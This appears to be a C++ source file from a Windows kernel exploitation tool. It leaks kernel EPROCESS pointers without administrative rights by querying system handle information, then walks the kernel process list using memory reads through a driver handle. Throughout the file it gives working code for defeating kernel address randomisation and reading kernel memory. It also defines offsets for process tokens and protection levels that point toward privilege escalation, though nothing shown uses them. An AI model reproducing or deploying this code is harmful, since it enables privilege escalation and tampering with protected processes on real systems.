#include "pch.h"
#include "kprocess.h"


DWORD EPROCESS_DIRECTORYTABLE_OFFSET = 0;
DWORD EPROCESS_UNIQUEPROCESSID_OFFSET = 0;
DWORD EPROCESS_ACTIVEPROCESSLINK_OFFSET = 0;
DWORD EPROCESS_VIRTUALSIZE = 0;
DWORD EPROCESS_SECTIONBASE = 0;
DWORD EPROCESS_IMAGEFILENAME = 0;
DWORD EPROCESS_PS_PROTECTION = 0;
DWORD EPROCESS_TOKEN = 0;

/* Purpose: gets EPROCESS/KPROCESS of a process.
   Warning: names are truncated to 16 bytes
*/


/* Purpose: gets virtual process base, size, and directory base from kernel
   Warning: names are truncated to 16 bytes
*/

uintptr_t find_kprocess(HANDLE driver, const char* image_name, uintptr_t& virtual_size_out, uintptr_t& directory_base_out)
{
	uintptr_t pml4 = find_directory_base(driver);

	if (!pml4)
		return NULL;

	// EPROCESS.KPROCESS has a circular linked list to all the processes on the system
	// the code below leaks one from the kernel and uses it to traverse all of the elements

	uintptr_t kprocess_initial = leak_kprocess(driver, pml4);

	if (!kprocess_initial)
		return NULL;

	// 

	printf("    pml4: %llx\n", pml4);
	printf("    kprocess_initial: %llx\n", kprocess_initial);

	//lkd> dt _eprocess FFFFC083E4EC5040
	//	nt!_EPROCESS
	//	+ 0x2e8 ActiveProcessLinks	: _LIST_ENTRY[0xffffc083`e4f4f328 - 0xfffff802`449bd370]

	const unsigned long limit = 400;
	unsigned long count = 0;

	uintptr_t link_start = kprocess_initial + EPROCESS_ACTIVEPROCESSLINK_OFFSET;
	uintptr_t flink = link_start;
	uintptr_t kprocess_out = 0;

	do
	{
		read_virtual_memory(driver, pml4, flink, &flink, sizeof(PVOID));

		uintptr_t kprocess = flink - EPROCESS_ACTIVEPROCESSLINK_OFFSET;
		uintptr_t virtual_size = read_virtual_memory<uintptr_t>(driver, pml4, kprocess + EPROCESS_VIRTUALSIZE);

		if (virtual_size == 0)
			continue;

		uintptr_t directory_table = read_virtual_memory<uintptr_t>(driver, pml4, kprocess + EPROCESS_DIRECTORYTABLE_OFFSET);
		uintptr_t base_address = read_virtual_memory<uintptr_t>(driver, pml4, kprocess + EPROCESS_SECTIONBASE);

		char name[16] = { 0 };
		read_virtual_memory(driver, pml4, kprocess + EPROCESS_IMAGEFILENAME, &name, 15);


		if (strcmp(name, image_name) == 0)
		{
			printf("    process: %s\n", name);
			printf("    base: %llx\n", base_address);
			printf("    size: %llx\n", virtual_size);
			printf("    kprocess: %llx\n", kprocess);

			kprocess_out = kprocess;
			virtual_size_out = virtual_size;
			directory_base_out = directory_table;

			break;
		}

		if (count >= limit)
			break;

		count++;

	} while (flink != link_start);

	return kprocess_out;
}

uintptr_t find_kprocess(HANDLE driver, const char* image_name, DWORD pid, uintptr_t& virtual_size_out, uintptr_t& directory_base_out)
{
	uintptr_t pml4 = find_directory_base(driver);

	if (!pml4)
		return NULL;

	// EPROCESS.KPROCESS has a circular linked list to all the processes on the system
	// the code below leaks one from the kernel and uses it to traverse all of the elements

	uintptr_t kprocess_initial = leak_kprocess(driver, pml4);

	if (!kprocess_initial)
		return NULL;

	// 

	printf("    pml4: %llx\n", pml4);
	printf("    kprocess_initial: %llx\n", kprocess_initial);

	//lkd> dt _eprocess FFFFC083E4EC5040
	//	nt!_EPROCESS
	//	+ 0x2e8 ActiveProcessLinks	: _LIST_ENTRY[0xffffc083`e4f4f328 - 0xfffff802`449bd370]

	const unsigned long limit = 400;
	unsigned long count = 0;

	uintptr_t link_start = kprocess_initial + EPROCESS_ACTIVEPROCESSLINK_OFFSET;
	uintptr_t flink = link_start;
	uintptr_t kprocess_out = 0;

	do
	{
		read_virtual_memory(driver, pml4, flink, &flink, sizeof(PVOID));

		uintptr_t kprocess = flink - EPROCESS_ACTIVEPROCESSLINK_OFFSET;
		uintptr_t virtual_size = read_virtual_memory<uintptr_t>(driver, pml4, kprocess + EPROCESS_VIRTUALSIZE);

		if (virtual_size == 0)
			continue;

		uintptr_t directory_table = read_virtual_memory<uintptr_t>(driver, pml4, kprocess + EPROCESS_DIRECTORYTABLE_OFFSET);
		uintptr_t base_address = read_virtual_memory<uintptr_t>(driver, pml4, kprocess + EPROCESS_SECTIONBASE);

		char name[16] = { 0 };
		DWORD PID = 0;

		read_virtual_memory(driver, pml4, kprocess + EPROCESS_UNIQUEPROCESSID_OFFSET, &PID, 4);
		read_virtual_memory(driver, pml4, kprocess + EPROCESS_IMAGEFILENAME, &name, 15);


		if (strcmp(name, image_name) == 0 && PID == pid)
		{
			printf("    process: %s\n", name);
			printf("    pid: %d\n", PID);
			printf("    base: %llx\n", base_address);
			printf("    size: %llx\n", virtual_size);
			printf("    kprocess: %llx\n", kprocess);

			kprocess_out = kprocess;
			virtual_size_out = virtual_size;
			directory_base_out = directory_table;

			break;
		}

		if (count >= limit)
			break;

		count++;

	} while (flink != link_start);

	return kprocess_out;
}

uintptr_t leak_kprocess(HANDLE driver, uintptr_t pml4)
{
	// these are 98% guaranteed to be eprocess struct pointers
	// some validation will be required after, only one valid
	// pointer is required

	std::vector<uintptr_t> pointers;

	if (!leak_kernel_pointers(pointers))
		printf("[-] failed to leak kprocess list\n");

	// find first valid kprocess

	const unsigned int SanityCheckWin10_KPROCESS = 0xB60003;

	for (uintptr_t pointer : pointers)
	{
		unsigned int check = 0;
		read_virtual_memory(driver, pml4, pointer, &check, sizeof(unsigned int));

		if (check == SanityCheckWin10_KPROCESS)
		{
			return pointer;
			break;
		}
	}

	return NULL;
}

// Copyright ICY 600BC - 2019 AD
//
// The following code gives you the EPROCESS.KPROCESS pointer for processes running on
// your system without the need of any kernel driver or administrative rights. It is 
// an adaptation of code[1][2] that has previously worked on earlier versions of
// windows.

// The original method seems to break on builds>= 1803. As such, it has been adapted
// to do the following:
//   1.	Dump all of the system handles of Process 4 (System)
//	 2.	Check if lpHandleInformation->Handles[i].HandleAttributes is 0x102A
//	 3.	Feed the result to another function that uses the KPROCESS.ActiveProcessLinks
//		LIST_ENTRY (+0x2e8) 

// Tested (Windows 10 1803) 17134.228
// Tested (Windows 10 1803) 17134.523
// Tested (Windows 10 1809) 17763.253 rs5_release

// Some hurdles involved with this method that were accounted for.:
//	1. This particular SYSTEM_INFORMATION_CLASS doesn't accurately return the correct number of bytes required.
//	2. ObjectTypeIndex is related to the order in which object types are created. Should not be defined as a constant.

// 0x102A HandleAttribute explained:
//

// The following materials were used as a reference in building this code
// http://blog.rewolf.pl/blog/?p=1683
// https://github.com/clymb3r/KdExploitMe/blob/master/ExploitDemos/KernelAddressLeak.cpp


// There are some considerations to take in account when using different builds of the
// windows operating system.

bool leak_kernel_pointers(std::vector<uintptr_t>& pointers)
{
	// This particular SYSTEM_INFORMATION_CLASS doesn't accurately return the correct number of bytes required
	// some extra space is needed to avoid NTSTATUS C0000004 (STATUS_INFO_LENGTH_MISMATCH)
	//

	const unsigned long SystemExtendedHandleInformation = 0x40;

	unsigned long buffer_length = 0;
	unsigned char probe_buffer[1024] = { 0 };
	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation), &probe_buffer, sizeof(probe_buffer), &buffer_length);

	if (!buffer_length)
	{
		printf("[-] failed to call NtQuerySystemInformation( ), NTSTATUS=%0x\n", status);
		return false;
	}

	buffer_length += 50 * (sizeof(SYSTEM_HANDLE_INFORMATION_EX) + sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));

	PVOID buffer = VirtualAlloc(nullptr, buffer_length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (!buffer)
	{
		printf("[-] failed to call VirtualAlloc( ), GetLastError( )=%d\n", GetLastError());
		return false;
	}

	RtlSecureZeroMemory(buffer, buffer_length);

	unsigned long buffer_length_correct = 0;
	status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation), buffer, buffer_length, &buffer_length_correct);

	if (!NT_SUCCESS(status))
	{
		printf("[-] failed to call NtQuerySystemInformation( ), NTSTATUS=0x%x, uSizeReturn=0x%x (got:0x%x)\n", status, buffer_length_correct, buffer_length);
		return false;
	}

	SYSTEM_HANDLE_INFORMATION_EX* handle_information = reinterpret_cast<SYSTEM_HANDLE_INFORMATION_EX*>(buffer);

	for (unsigned int i = 0; i < handle_information->NumberOfHandles; i++)
	{
		const unsigned int SystemUniqueReserved = 4;
		const unsigned int SystemKProcessHandleAttributes = 0x102A;

		if (handle_information->Handles[i].UniqueProcessId == SystemUniqueReserved &&
			handle_information->Handles[i].HandleAttributes == SystemKProcessHandleAttributes)
		{
			pointers.push_back(reinterpret_cast<uintptr_t>(handle_information->Handles[i].Object));
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);
	return true;
}